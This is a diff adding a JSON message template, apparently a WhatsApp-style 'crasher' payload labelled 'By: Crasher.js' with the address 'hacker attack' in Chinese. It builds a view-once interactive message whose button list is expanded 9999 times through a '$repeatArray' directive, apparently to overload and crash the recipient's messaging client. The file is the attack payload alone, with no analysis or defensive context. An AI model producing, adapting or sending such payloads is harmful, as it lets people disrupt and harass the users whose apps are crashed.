@@ -1,0 +1,25 @@
+{
+  "viewOnceMessage": {
+    "message": {
+      "interactiveMessage": {
+        "header": {
+          "hasMediaAttachment": true,
+          "locationMessage": {
+            "degreesLatitude": 0,
+            "degreesLongitude": 0,
+            "name": "𝐁𝐲: 𝐂𝐫𝐚𝐬𝐡𝐞𝐫.𝐣𝐬",
+            "address": "駭客攻擊",
+            "jpegThumbnail": "sex"
+          }
+        },
+        "body": {
+          "text": ""
+        },
+        "nativeFlowMessage": {
+          "buttons": "$repeatArray([{\"name\":\"cta_url\",\"buttonParamsJson\":\"{\\\"display_text\\\":\\\"🪐\\\",\\\"url\\\":\\\"x\\\",\\\"merchant_url\\\":\\\"x\\\"}\"}],9999)",
+          "messageVersion": 3
+        }
+      }
+    }
+  }
+}
